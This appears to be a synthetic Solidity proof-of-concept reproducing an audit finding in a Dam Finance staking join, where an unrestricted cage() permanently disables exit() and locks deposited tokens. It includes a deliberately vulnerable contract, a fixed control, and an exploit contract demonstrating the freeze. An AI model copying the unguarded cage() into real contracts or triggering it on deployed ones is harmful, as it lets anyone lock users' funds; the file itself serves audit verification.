// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Dam Finance LMCV StakeJoin — cage() sets live = 0 and nothing sets it back,
    so exit() reverts CollateralJoin/not-live and the joined tokens stay in the
    contract (Halborn, LMCV part 2). StakeJoin.sol exit + RewardJoin.sol cage.
    SYNTHETIC, cheatcode-free reduction of the quoted functions.
    1,000 tokens are joined. After cage, exit reverts and the 1,000 stays.
    The control join is never caged, so exit pays the 1,000 back. */

contract Token {
    string public symbol = "STAKE";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Harm {
    string public symbol = "LOCKED";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract StakeJoin {
    Token public token;
    uint256 public live = 1;
    mapping(address => uint256) public staked;

    constructor(address _token) {
        token = Token(_token);
    }

    function join(address usr, uint256 wad) external {
        require(live == 1, "CollateralJoin/not-live");
        require(token.transferFrom(msg.sender, address(this), wad), "StakeJoin/join");
        staked[usr] += wad;
    }

    function cage() external {
        // @> VULN: cage clears live and no function sets it back to 1
        live = 0;
    }

    function exit(address usr, uint256 wad) external {
        require(live == 1, "CollateralJoin/not-live");
        staked[msg.sender] -= wad;
        require(token.transfer(usr, wad), "CollateralJoin/failed-transfer");
    }
}

contract FixedJoin {
    Token public token;
    uint256 public live = 1;
    mapping(address => uint256) public staked;

    constructor(address _token) {
        token = Token(_token);
    }

    function join(address usr, uint256 wad) external {
        require(live == 1, "CollateralJoin/not-live");
        require(token.transferFrom(msg.sender, address(this), wad), "StakeJoin/join");
        staked[usr] += wad;
    }

    function exit(address usr, uint256 wad) external {
        require(live == 1, "CollateralJoin/not-live");
        staked[msg.sender] -= wad;
        require(token.transfer(usr, wad), "CollateralJoin/failed-transfer");
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Harm public harm;
    Token public token;
    StakeJoin public buggy;
    FixedJoin public fixedJoin;

    bool public exitReverted;
    uint256 public stillInJoin;
    uint256 public controlPaid;
    uint256 public locked;

    constructor() {
        harm = new Harm();
        token = new Token();
        buggy = new StakeJoin(address(token));
        fixedJoin = new FixedJoin(address(token));
        token.mint(address(this), N * 2);
        token.approve(address(buggy), N);
        token.approve(address(fixedJoin), N);
    }

    function run() external {
        buggy.join(address(this), N);
        fixedJoin.join(address(this), N);
        require(token.balanceOf(address(buggy)) == N, "joined");
        buggy.cage();
        require(buggy.live() == 0, "caged");
        try buggy.exit(address(this), N) {
            exitReverted = false;
        } catch {
            exitReverted = true;
        }
        require(exitReverted, "exit worked");
        stillInJoin = token.balanceOf(address(buggy));
        require(stillInJoin == N, "not locked");
        require(buggy.staked(address(this)) == N, "stake record");
        fixedJoin.exit(address(this), N);
        controlPaid = token.balanceOf(address(this));
        require(controlPaid == N, "control");
        require(token.balanceOf(address(fixedJoin)) == 0, "control join");
        locked = stillInJoin;
        harm.mint(SINK, locked);
        require(harm.balanceOf(SINK) == N, "marked");
    }
}
